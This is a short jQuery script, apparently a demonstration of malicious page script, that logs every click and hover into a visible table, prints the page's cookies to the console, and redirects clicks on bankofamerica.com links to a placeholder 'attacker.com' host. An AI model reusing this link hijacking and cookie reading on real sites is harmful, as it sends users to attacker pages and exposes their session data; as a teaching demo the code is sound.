enabled = false;
$(document).ready(function() { 
    $("a").each(function () {
        if (this.href === "http://bankofamerica.com/"){
            console.log('hijacking link', this.href);
            $(this).click(function() {
                $(this).attr('href','');
                window.open("http://attacker.com", "_blank");
            })
        }
    });
    $("#enableBtn").click(function(){
        if(!enabled){
            $("#enableBtn").html("Disable");
        }else {
            $("#enableBtn").html( "Enable");
        }
        enabled = !enabled;
    });
    console.log(document.cookie);
    $(document).on("click",'*',function(){
        if(enabled)
            $('#demoTable > tbody:last-child').append('<tr> <td> '+ $(this).html().slice(0,50) +' was <span style="color: red">clicked</span> on' +'</td></tr>');
        console.log(this, 'was clicked on');
    });

    $(document).on("mouseenter",'*',function(){
        if(enabled)
            $('#demoTable > tbody:last-child').append('<tr> <td> '+ $(this).html().slice(0,50) +' was <span style="color: blue">hovered</span> on' +'</td></tr>');
        console.log(this, 'was hovered over');
        
    });
}); 

// var cookies =Cookies.get();
// console.log(cookies);